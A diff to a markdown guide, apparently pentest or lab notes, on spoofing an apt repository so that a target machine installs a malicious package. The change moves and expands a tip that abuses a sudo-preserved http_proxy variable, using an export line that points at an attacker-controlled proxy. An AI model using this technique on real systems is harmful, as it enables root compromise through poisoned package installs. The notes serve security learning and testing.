@@ -20,6 +20,8 @@
 
 ### Requirements: Trace down where the apt manager of the target machine installs its packages from by checking out the /etc/apt/sources.list/ directory. Also choose a package which is already present on the target machine (wget for example).
 
+##### TIP: In sudo configurations (sudo -l) if the http_proxy environment variable is kept while the command is executed as root, before doing the required setup, we can also do: export http_proxy="http://OUR_PROXY:8000" (The proxy is the one we open if we detect this env variable to force the package manager to use our repository) Run the proxy first, then run a simple python3 server and then check if your server receives any requests.
+
 ### Steps:
 
 #### 1) mkdir build
@@ -91,8 +93,6 @@
 #### 12) Create the directories by replicating the repository we want to spoof with the purpose of the target apt manager downloads the package from our repository instead. Place your package in the right folder according to use case. 
 
 #### 13) Run sudo apt-get update and sudo apt-get upgrade on target machine to download our malicious packages file.
-
-##### TIP: In sudo configurations (sudo -l) if the http_proxy environment variable is kept while the command is executed as root, before doing the required setup, we can also do: export http_proxy="http://OUR_PROXY:8000" (The proxy is the one we open if we detect this env variable to force the package manager to use our repository)
 
 #### 14) If the package has been downloaded, press yes to install it
 
